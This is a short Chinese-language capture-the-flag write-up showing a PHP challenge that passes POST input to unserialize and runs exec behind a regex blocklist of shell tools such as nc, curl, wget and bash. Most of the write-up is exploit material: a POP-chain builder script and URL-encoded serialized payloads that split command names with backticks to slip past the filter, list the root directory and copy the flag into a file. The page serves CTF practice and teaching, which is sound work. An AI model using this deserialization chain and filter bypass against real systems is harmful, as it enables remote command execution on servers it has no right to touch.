### RCE!!!

---

```php
<?php
highlight_file(__FILE__);
class minipop{
    public $code;
    public $qwejaskdjnlka;
    public function __toString()
    {
        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
            exec($this->code);
        }
        return "alright";
    }
    public function __destruct()
    {
        echo $this->qwejaskdjnlka;
    }
}
if(isset($_POST['payload'])){
    //wanna try?
    unserialize($_POST['payload']);
}
```

代码分析，最后是一个`exec`无回显执行，同时还需要使用反序列化的东西

```php
//构造pop链
$a = new minipop();
$b = new minipop();
$a->qwejaskdjnlka = $b;
$b->code = "执行代码";
echo urlencode(serialize($a));
```

注意过滤内容，第一次的时候我一直使用后缀`txt`一直不成功

```php
payload=O%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3BN%3Bs%3A13%3A%22qwejaskdjnlka%22%3BO%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7Cte%60%60e+bb%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BN%3B%7D%7D
```



![image-20240910231539923](https://gitee.com/bx33661/image/raw/master/path/image-20240910231539923.png)

```php
$a = new minipop();
$b = new minipop();
$a->qwejaskdjnlka = $b;
$b->code = "ta``c /flag_is_h3eeere |te``e cc";

payload=O%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3BN%3Bs%3A13%3A%22qwejaskdjnlka%22%3BO%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A32%3A%22ta%60%60c+%2Fflag_is_h3eeere+%7Cte%60%60e+cc%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BN%3B%7D%7D
```

![image-20240910231655359](https://gitee.com/bx33661/image/raw/master/path/image-20240910231655359.png)